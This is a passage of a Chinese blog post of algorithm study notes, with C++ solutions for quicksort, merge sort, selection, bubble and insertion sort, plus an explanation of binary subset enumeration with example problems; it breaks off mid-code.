class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">785</span>.快速排序<br><br>给定你一个长度为 <span class="hljs-built_in">n</span> 的整数数列。<br><br>请你使用快速排序对这个数列按照从小到大进行排序。<br><br>并将排好序的数列按顺序输出。<br><br>输入格式<br>输入共两行，第一行包含整数 <span class="hljs-built_in">n</span>。<br><br>第二行包含 <span class="hljs-built_in">n</span> 个整数（所有整数均在 <span class="hljs-number">1</span>∼<span class="hljs-number">109</span> 范围内），表示整个数列。<br><br>输出格式<br>输出共一行，包含 <span class="hljs-built_in">n</span> 个整数，表示排好序的数列。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>≤<span class="hljs-number">100000</span><br>输入样例：<br><span class="hljs-number">5</span><br><span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br>输出样例：<br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> a[N];<br><br><span class="hljs-comment">//模板</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">quick_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> a[],<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(l&gt;=r) <span class="hljs-keyword">return</span>;<span class="hljs-comment">//递归结束条件</span><br>    <span class="hljs-type">int</span> i=l<span class="hljs-number">-1</span>,j=r+<span class="hljs-number">1</span>,x=a[l+r&gt;&gt;<span class="hljs-number">1</span>];<span class="hljs-comment">//为什么要-1,因为在循环的时候会先加一</span><br>    <span class="hljs-keyword">while</span>(i&lt;j)<br>    &#123;<br>        <span class="hljs-keyword">do</span> i++;<span class="hljs-keyword">while</span>(a[i]&lt;x);<span class="hljs-comment">//找到大于中间值的量</span><br>        <span class="hljs-keyword">do</span> j--;<span class="hljs-keyword">while</span>(a[j]&gt;x);<span class="hljs-comment">//找到小于中间值的量</span><br>        <span class="hljs-keyword">if</span>(i&lt;j) <span class="hljs-built_in">swap</span>(a[i],a[j]);<span class="hljs-comment">//如果i&lt;j,就交换两个值</span><br>    &#125;<br>    <span class="hljs-built_in">quick_sort</span>(a,l,j);<span class="hljs-comment">//进行二分递归</span><br>    <span class="hljs-built_in">quick_sort</span>(a,j+<span class="hljs-number">1</span>,r);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a[i]);<br>    <span class="hljs-built_in">quick_sort</span>(a,<span class="hljs-number">0</span>,n<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) i==n<span class="hljs-number">-1</span>?cout&lt;&lt;a[i]&lt;&lt;endl:cout&lt;&lt;a[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="归并排序">归并排序</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">787</span>.归并排序<br><br>给定你一个长度为 <span class="hljs-built_in">n</span> 的整数数列。<br><br>请你使用归并排序对这个数列按照从小到大进行排序。<br><br>并将排好序的数列按顺序输出。<br><br>输入格式<br>输入共两行，第一行包含整数 <span class="hljs-built_in">n</span>。<br><br>第二行包含 <span class="hljs-built_in">n</span> 个整数（所有整数均在 <span class="hljs-number">1</span>∼<span class="hljs-number">109</span> 范围内），表示整个数列。<br><br>输出格式<br>输出共一行，包含 <span class="hljs-built_in">n</span> 个整数，表示排好序的数列。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>≤<span class="hljs-number">100000</span><br>输入样例：<br><span class="hljs-number">5</span><br><span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br>输出样例：<br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e6</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> q[N],tmp[N];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">merge_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(l&gt;=r) <span class="hljs-keyword">return</span>;<span class="hljs-comment">//递归结束条件</span><br>    <span class="hljs-type">int</span> mid=l+r&gt;&gt;<span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">merge_sort</span>(l,mid),<span class="hljs-built_in">merge_sort</span>(mid+<span class="hljs-number">1</span>,r);<span class="hljs-comment">//递归二分到最小单元</span><br>    <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>,i=l,j=mid+<span class="hljs-number">1</span>;<span class="hljs-comment">//两个数组部分的第一个元素</span><br>    <span class="hljs-keyword">while</span>(i&lt;=mid&amp;&amp;j&lt;=r)<span class="hljs-comment">//没有超过两个数组部分的最后一个位置</span><br>    &#123;<br>        <span class="hljs-comment">//有序合并两个数组</span><br>        <span class="hljs-keyword">if</span>(q[i]&lt;q[j]) tmp[k++]=q[i++];<br>        <span class="hljs-keyword">else</span> tmp[k++]=q[j++];<br>    &#125;<br>    <span class="hljs-keyword">while</span>(i&lt;=mid) tmp[k++]=q[i++];<span class="hljs-comment">//如果还有剩余部分没有合并，就直接接上去</span><br>    <span class="hljs-keyword">while</span>(j&lt;=r) tmp[k++]=q[j++];<br>    <span class="hljs-keyword">for</span>(k=<span class="hljs-number">0</span>,i=l;i&lt;=r;i++,k++) q[i]=tmp[k];<span class="hljs-comment">//将有序的数组还原回原数组的对应位置，注意时对应位置</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) cin&gt;&gt;q[i];<br>    <span class="hljs-built_in">merge_sort</span>(<span class="hljs-number">0</span>,n<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) i==n<span class="hljs-number">-1</span>?cout&lt;&lt;q[i]&lt;&lt;endl:cout&lt;&lt;q[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="选择排序on2">选择排序O(N^2)</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">787</span>.归并排序<br><br>给定你一个长度为 <span class="hljs-built_in">n</span> 的整数数列。<br><br>请你使用归并排序对这个数列按照从小到大进行排序。<br><br>并将排好序的数列按顺序输出。<br><br>输入格式<br>输入共两行，第一行包含整数 <span class="hljs-built_in">n</span>。<br><br>第二行包含 <span class="hljs-built_in">n</span> 个整数（所有整数均在 <span class="hljs-number">1</span>∼<span class="hljs-number">109</span> 范围内），表示整个数列。<br><br>输出格式<br>输出共一行，包含 <span class="hljs-built_in">n</span> 个整数，表示排好序的数列。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>≤<span class="hljs-number">100000</span><br>输入样例：<br><span class="hljs-number">5</span><br><span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br>输出样例：<br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e6</span>;<br><span class="hljs-type">int</span> a[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>   <span class="hljs-type">int</span> n;<br>   cin&gt;&gt;n;<br>   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) cin&gt;&gt;a[i];<br>   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n<span class="hljs-number">-1</span>;i++)<br>   &#123;<br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i+<span class="hljs-number">1</span>;j&lt;n;j++)<br>     &#123;<br>       <span class="hljs-keyword">if</span>(a[i]&gt;a[j]) <span class="hljs-built_in">swap</span>(a[i],a[j]); <br>     &#125;<br>   &#125;<br>   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) cout&lt;&lt;a[i]&lt;&lt;<span class="hljs-string">&quot;　&quot;</span>;<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="冒泡排序">冒泡排序</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 1000;</span><br><span class="hljs-type">int</span> a[<span class="hljs-number">1000</span>];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">bubble_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=n;i++)<br>    &#123;<br>        <span class="hljs-type">bool</span> flag=<span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n-i;j++)&#123;<br>            <span class="hljs-keyword">if</span>(a[j]&gt;a[j+<span class="hljs-number">1</span>])&#123;<br>                <span class="hljs-built_in">swap</span>(a[j],a[j+<span class="hljs-number">1</span>]);<br>                flag=<span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(flag) <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;data)!=EOF)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!data)&#123;<br>            n--;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> a[n++]=data;<br>    &#125;<br>    <span class="hljs-built_in">bubble_sort</span>(n);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=n;i++) cout&lt;&lt;a[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    cout&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="直接插入算法">直接插入算法</h2><p><strong>算法核心</strong></p><p>从第二个元素开始，一旦有元素a[j-1]&gt;a[j],那么就需要调整顺序。</p><p>先将a[j]存储到a[0],然后将a[j]=a[j-1],接着从j-2后往前比对，如果a[j]&gt;a[0],那么就将a[j+1]=a[j],如果a[j]&lt;=a[0],那么a[j+1]=a[0],结束本轮循环。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//直接插入排序算法</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 1000;</span><br><span class="hljs-type">int</span> a[<span class="hljs-number">1000</span>];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DirectInsertSort</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> j;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(a[i]&lt;a[i<span class="hljs-number">-1</span>])<br>        &#123;<br>            a[<span class="hljs-number">0</span>]=a[i];<br>            a[i]=a[i<span class="hljs-number">-1</span>];<br>            <span class="hljs-keyword">for</span>(j=i<span class="hljs-number">-2</span>;a[<span class="hljs-number">0</span>]&lt;a[j];j--) a[j+<span class="hljs-number">1</span>]=a[j];<br>            a[j+<span class="hljs-number">1</span>]=a[<span class="hljs-number">0</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n=<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;data)!=EOF)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!data)&#123;<br>            n--;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> a[n++]=data;<br>    &#125;<br>    <span class="hljs-built_in">DirectInsertSort</span>(n);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cout&lt;&lt;a[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    cout&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="二进制枚举">二进制枚举</h1><p><ahref="https://blog.csdn.net/sugarbliss/article/details/81099340">详细介绍二进制枚举</a></p><p>1.含有N个元素的集合的一切子集个数有2^n种，二进制采用0和1来表示数字。于是我们可以利用二进制特性，将含n个元素都用0和1来表示选和不选，于是就可以得到每一种子集的情况。</p><p>2.那我们如何找到每个位置是否选和不选？可以采用位运算和与运算结合的方式。&lt;&lt;运算相当于在01串的尾巴处加上0（左移一位相当于乘以2），而与运算的规则是全为1才可以得到1。那么我们就可以通过对1不断进行左移运算和与运算得到每个位置的选择情况</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&lt;&lt;<span class="hljs-number">1</span>=<span class="hljs-number">2</span>(<span class="hljs-number">10</span>);  <span class="hljs-number">1000</span>&amp;<span class="hljs-number">0010</span>=<span class="hljs-number">0000</span><br><br><span class="hljs-attribute">1</span>&lt;&lt;<span class="hljs-number">2</span>=<span class="hljs-number">4</span>(<span class="hljs-number">100</span>); <span class="hljs-number">1000</span>&amp;<span class="hljs-number">0100</span>=<span class="hljs-number">0000</span><br><br><span class="hljs-attribute">1</span>&lt;&lt;<span class="hljs-number">3</span>=<span class="hljs-number">8</span>(<span class="hljs-number">1000</span>); <span class="hljs-number">1000</span>&amp;<span class="hljs-number">1000</span>=<span class="hljs-number">1000</span><br><br><span class="hljs-attribute">1</span>&lt;&lt;<span class="hljs-number">4</span>=<span class="hljs-number">16</span>(<span class="hljs-number">10000</span>); <span class="hljs-number">01000</span>&amp;<span class="hljs-number">10000</span>=<span class="hljs-number">00000</span><br></code></pre></td></tr></table></figure><p>例题：</p><h3 id="和为k--二进制枚举">和为K--二进制枚举</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs 题目">Description<br>给出长度为n的数组,求能否从中选出若干个,使他们的和为K.如果可以,输出:Yes,否则输出No<br>Input<br>第一行：输入N,K,为数组的长度和需要判断的和(2&lt;=N&lt;=20,1&lt;=K&lt;=10^9)<br>第二行：N个值，表示数组中元素的值(1&lt;=a[i]&lt;=10^6)<br>Output<br>输出Yes或No<br>Sample Input<br>5 13<br>2 4 6 8 10<br>Sample Output<br>No<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,k;<br>    <span class="hljs-keyword">while</span>(cin&gt;&gt;n&gt;&gt;k)<br>    &#123;<br>        <span class="hljs-type">int</span> a[n];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) cin&gt;&gt;a[i];<br>        <span class="hljs-type">int</span> flag=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;(<span class="hljs-number">1</span>&lt;&lt;n);i++)<span class="hljs-comment">//共有1&lt;&lt;n种子集，遍历每种子集</span><br>        &#123;<br>            <span class="hljs-type">int</span> sum=<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<span class="hljs-comment">//遍历每个位置</span><br>            &#123;<br>                <span class="hljs-keyword">if</span>(i&amp;(<span class="hljs-number">1</span>&lt;&lt;j))  sum+=a[j];<span class="hljs-comment">//如果选择该位置，就加上该位置的值</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(sum==k)&#123;<br>                cout&lt;&lt;<span class="hljs-string">&quot;Yes&quot;</span>&lt;&lt;endl;<br>                flag=<span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(flag) cout&lt;&lt;<span class="hljs-string">&quot;No&quot;</span>&lt;&lt;endl;<br>     &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="陈老师加油-二进制枚举">陈老师加油-二进制枚举</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs 题目">Description<br>陈老师经常开车在哈尔滨的大街上行走，假设刚开始油箱里有T升汽油，每看见加油站陈老师就要把汽油的总量翻倍（就是乘2）；每看见十字路口气油就要减少1升；最后的时候陈老师的车开到一个十字路口，然后车就没油了------就熄火了，陈老师好痛苦啊~~~！<br>然后他就开始回忆，一路上一共遇到5个加油站，10个十字路口，问造成这种惨烈的境遇有多少种可能？<br><br>Input<br>输入一个T ，（1&lt;=T&lt;=100）;<br>Output<br>输出可能的方案数。<br>Sample Input<br>1<br>Sample Output<br>10<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-keyword">while</span>(cin&gt;&gt;n)<br>    &#123;<br>        <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">15</span>);i++)<span class="hljs-comment">//遍历每种情况</span><br>        &#123;<br>            <span class="hljs-type">int</span> a=<span class="hljs-number">0</span>,b=<span class="hljs-number">0</span>,tmp=n;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span 